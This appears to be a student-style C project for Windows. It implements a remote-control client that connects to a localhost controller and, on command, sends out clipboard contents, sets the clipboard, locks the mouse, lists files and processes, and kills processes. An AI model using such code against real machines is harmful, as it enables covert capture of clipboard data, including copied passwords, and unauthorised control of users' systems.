#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_PORT "2137"
WSADATA wsaData;
int lockMouse()
{
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    RECT lockRect;
    lockRect.left = screenWidth / 4;
    lockRect.top = screenHeight / 4;
    lockRect.right = 3 * screenWidth / 4;
    lockRect.bottom = 3 * screenHeight / 4;

    return ClipCursor(&lockRect);
}
int setClipboardText(const char *text) {
    // Open the clipboard
    if (OpenClipboard(NULL)) {
        // Clear the clipboard
        EmptyClipboard();

        // Allocate memory for the text in the clipboard
        size_t size = strlen(text) + 1; // +1 for null terminator
        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
        if (hGlobal) {
            // Lock memory and copy the text into the allocated memory
            char *clipboardData = (char *)GlobalLock(hGlobal);
            if (clipboardData) {
                strcpy(clipboardData, text); // Copy the string to clipboard data
                GlobalUnlock(hGlobal);

                // Set the clipboard data for CF_TEXT (ANSI text format)
                SetClipboardData(CF_TEXT, hGlobal);
            }else
                return 1;
            GlobalFree(hGlobal);
        }else
            return 1;

        // Close the clipboard
        CloseClipboard();
    } else {
        printf("Failed to open clipboard.\n");
        return 1;
    }
    return 0;
}

LPCWSTR GetClipboardText() {
    if (!OpenClipboard(NULL)) {
        printf("Failed to open clipboard.\n");
        return NULL;
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData == NULL) {
        printf("No Unicode text in clipboard.\n");
        CloseClipboard();
        return NULL;
    }

    LPCWSTR pszText = (LPCWSTR)GlobalLock(hData);
    if (pszText == NULL) {
        printf("Failed to lock global memory.\n");
        CloseClipboard();
        return NULL;
    }

    // Correct format for wide string output
   // wprintf(L"Clipboard contents: %ls\n", pszText);

    GlobalUnlock(hData);
    CloseClipboard();
    return  pszText;
}
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "message.h"

#define CHUNK_SIZE 512

void process_chunk(const char* chunk, int size, int chunk_num) {
    printf("Chunk %d (size %d):\n%.*s\n\n", chunk_num, size, size, chunk);
}

int sendClipboard(SOCKET socket) {
    LPCWSTR wideStr = GetClipboardText();
    MESSAGE msg;
    memset(msg.payload, 0, 512);
    int totalWchars = lstrlenW(wideStr);
    int offset = 0;
    int chunkNum = 0;

    while (offset < totalWchars) {
        char chunk[CHUNK_SIZE];
        int charsLeft = totalWchars - offset;
        if (charsLeft > 512)
            msg.hasNext = NEXT_TRUE;
        else
            msg.hasNext = NEXT_FALSE;
        if (charsLeft > 512) charsLeft = CHUNK_SIZE/2;

        int charsConverted = WideCharToMultiByte(
                CP_UTF8,
                0,
                wideStr + offset,
                charsLeft,
                chunk,
                CHUNK_SIZE,
                NULL,
                NULL
        );

        if (charsConverted == 0) {
            DWORD err = GetLastError();
            printf("Conversion failed at offset %d. Error: %lu\n", offset, err);
            break;
        }

        // Count how many wide chars were consumed
        int actualWchars = 0;
        for (int i = 1; i <= charsLeft; ++i) {
            int temp = WideCharToMultiByte(CP_UTF8, 0, wideStr + offset, i, NULL, 0, NULL, NULL);
            if (temp > CHUNK_SIZE) break;
            actualWchars = i;
        }
        msg.header = GET_CLIPBOARD;
        memset(msg.payload, 0, 512);
        strcpy(msg.payload, chunk);
        send(socket, (char *)&msg, sizeof(MESSAGE ), 0);
        printf("%d\n", msg.hasNext);
        //process_chunk(chunk, charsConverted, chunkNum++);
        offset += actualWchars;
    }

    return 0;
}

int get_files(char *path, SOCKET ConnectSocket)
{
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;
    MESSAGE msg;
    msg.header = GET_FILES;
    msg.hasNext = TRUE;

    char searchPath[MAX_PATH];

    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed (%lu)\n", GetLastError());
        return 1;
    }

    do {
        memset(msg.payload, 0, 512);
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            sprintf(msg.payload, "[DIR]  %s", findFileData.cFileName);
        } else {
            sprintf(msg.payload, "[FILE] %s", findFileData.cFileName);
        }
        msg.hasNext = NEXT_TRUE;
        msg.header = GET_FILES;
        send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
    } while (FindNextFile(hFind, &findFileData) != 0);
    msg.header = GET_FILES;
    msg.hasNext = NEXT_FALSE;
    memset(msg.payload, 0, 512);
    send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
    FindClose(hFind);
    return 0;
}
int get_processes(char *cmp, SOCKET ConnectSocket)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
        return 1;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);


    if (!Process32First(hProcessSnap, &pe32)) {
        printf("Process32First failed (%lu)\n", GetLastError());
        CloseHandle(hProcessSnap);
        return 1;
    }

    MESSAGE msg;
    msg.header = GET_PROCESSES;

    do {
        size_t len = strlen(cmp);
        msg.header = GET_PROCESSES;
        msg.hasNext = NEXT_TRUE;
        memset(msg.payload, 0, 512);

        if(len == 0)
        {
            sprintf(msg.payload, "PID: %-6lu  Name: %s\n", pe32.th32ProcessID, pe32.szExeFile);
            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
        }
        else if (len <= strlen(pe32.szExeFile))
        {
            if(strncmp( pe32.szExeFile, cmp, len) == 0)
            {
                sprintf(msg.payload, "PID: %-6lu  Name: %s\n", pe32.th32ProcessID, pe32.szExeFile);
                send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));
    msg.header = GET_PROCESSES;
    msg.hasNext = NEXT_FALSE;
    memset(msg.payload, 0, 512);
    send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
    CloseHandle(hProcessSnap);
    return 0;
}
int kill_process(DWORD pid, SOCKET ConnectSocket)
{
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    MESSAGE msg;
    msg.hasNext = NEXT_FALSE;
    if (hProcess == NULL)
    {

        sprintf(msg.payload, "Failed to open process. Error: %lu", GetLastError());
        msg.header = RESPONSE_FAILED;
        send(ConnectSocket, (char *)&msg, sizeof (MESSAGE), 0);
        return 1;
    }

    if (!TerminateProcess(hProcess, 0)) {
        sprintf(msg.payload, "Failed to terminate process. Error: %lu", GetLastError());
        msg.header = RESPONSE_FAILED;
        send(ConnectSocket, (char *)&msg, sizeof (MESSAGE), 0);
        CloseHandle(hProcess);
        return 1;
    }

    sprintf(msg.payload, "Process %lu terminated successfully.", pid);
    msg.header = RESPONSE_OK;
    send(ConnectSocket, (char *)&msg, sizeof (MESSAGE), 0);
    CloseHandle(hProcess);
    return 0;
}
int main()
{
    int iResult;

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }
    struct addrinfo *result = NULL,
            *ptr = NULL,
            hints;

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_IP;

    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
    if (iResult != 0)
    {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    SOCKET ConnectSocket = INVALID_SOCKET;

    ptr=result;

    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
                           ptr->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Error at socket(): %d\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }
    iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
        printf("r\n");
    }

// Should really try the next address returned by getaddrinfo
// if the connect call failed
// But for this simple example we just free the resources
// returned by getaddrinfo and print an error message

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
#define DEFAULT_BUFLEN 512

    int recvbuflen = DEFAULT_BUFLEN;

    MESSAGE msg;


    while(1){
        iResult = recv(ConnectSocket, (char *)&msg, sizeof(msg), 0);

        if (iResult == SOCKET_ERROR)
        {
            printf("shutdown failed: %d\n", WSAGetLastError());
            closesocket(ConnectSocket);
            WSACleanup();
            return 1;
        }
        printf("Received HEADER: %d\n", msg.header);
        if(msg.header == SIGNAL_CLIPBOARD)
            sendClipboard(ConnectSocket);
        if(msg.header == SIGNAL_CLOSE)
            break;
        if(msg.header == SIGNAL_CLIPBOARD_SET)
        {
            if(setClipboardText(msg.payload))
                msg.header = RESPONSE_FAILED;
            else
                msg.header = RESPONSE_OK;
            memset(msg.payload, 0, 512);
            msg.hasNext = NEXT_FALSE;
            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
        }
        if(msg.header == SIGNAL_MOUSE_LOCK)
        {
            if(!lockMouse())
                msg.header = RESPONSE_FAILED;
            else
                msg.header = RESPONSE_OK;
            memset(msg.payload, 0, 512);
            msg.hasNext = NEXT_FALSE;
            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
        }
        if(msg.header == SIGNAL_MOUSE_UNLOCK)
        {
            if(!ClipCursor(NULL))
                msg.header = RESPONSE_FAILED;
            else
                msg.header = RESPONSE_OK;
            memset(msg.payload, 0, 512);
            msg.hasNext = NEXT_FALSE;
            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
        }
        if(msg.header == SIGNAL_FILES)
        {
            get_files(msg.payload, ConnectSocket);
        }
        if(msg.header == SIGNAL_PROCESSES)
        {
            get_processes(msg.payload, ConnectSocket);
        }
        if(msg.header == SIGNAL_KILL_PROCESS)
        {
            kill_process(*(DWORD*)msg.payload, ConnectSocket);
        }
    }
    closesocket(ConnectSocket);

    return 0;
}
